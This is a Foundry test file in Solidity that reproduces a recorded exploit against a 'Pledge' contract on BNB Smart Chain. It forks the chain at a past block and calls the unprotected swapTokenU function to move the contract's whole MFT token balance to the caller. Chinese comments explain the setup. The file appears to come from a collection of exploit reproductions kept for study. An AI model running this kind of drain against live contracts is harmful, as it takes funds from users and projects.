// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 15K
// Attacker : https://bscscan.com/address/0x59367b057055fd5d38ab9c5f0927f45dc2637390
// Attack Contract : https://bscscan.com/address/0x4aa0548019bfecd343179d054b1c7fa63e1e0b6c
// Vulnerable Contract : https://bscscan.com/address/0x061944c0f3c2d7dabafb50813efb05c4e0c952e1
// Attack Tx : https://bscscan.com/tx/0x63ac9bc4e53dbcfaac3a65cb90917531cfdb1c79c0a334dda3f06e42373ff3a0

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x061944c0f3c2d7dabafb50813efb05c4e0c952e1#code

// @Analysis
// Post-mortem :
// Twitter Guy :
// Hacking God :
pragma solidity ^0.8.0;

import "../interface.sol";

interface IPledge {
    function swapTokenU(uint256 amount, address _target) external;
}

contract Pledge is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 44_555_337;
    address internal constant pledge = 0x061944c0f3c2d7DABafB50813Efb05c4e0c952e1;
    address internal constant MFT = 0x4E5A19335017D69C986065B21e9dfE7965f84413;
    //BUSD 是 Binance 发行的稳定币，通常用于交易、流动性池等场景。
    address internal constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
    
    function setUp() public {
        /*
          "bsc"：表示分叉的是 Binance Smart Chain (BSC)，即模拟环境将使用 BSC 的状态。
          blocknumToForkFrom：指明从哪个区块高度开始进行分叉。即 44_555_337 这个区块号，它是该网络上的一个历史区块，代码将从该区块的状态进行模拟。
        */
        vm.createSelectFork("bsc", blocknumToForkFrom);
        /*
            deal 是 Foundry 测试框架中的一个方法，用于在指定地址分配某种资产。
            这里，它表示将 BUSD 代币分配到当前合约的地址（address(this)），并且分配数量为 0。
            BUSD：代币的合约地址。
            address(this)：当前合约的地址。
            0：指定的数量，这里是将 0 个 BUSD 代币分配给当前合约。
       */
        deal(BUSD, address(this), 0);
        fundingToken = address(BUSD);
    }

    function testExploit() public balanceLog {
        uint256 amount = IERC20(MFT).balanceOf(pledge);
        address _target = address(this);
        IPledge(pledge).swapTokenU(amount, _target);
    }
}
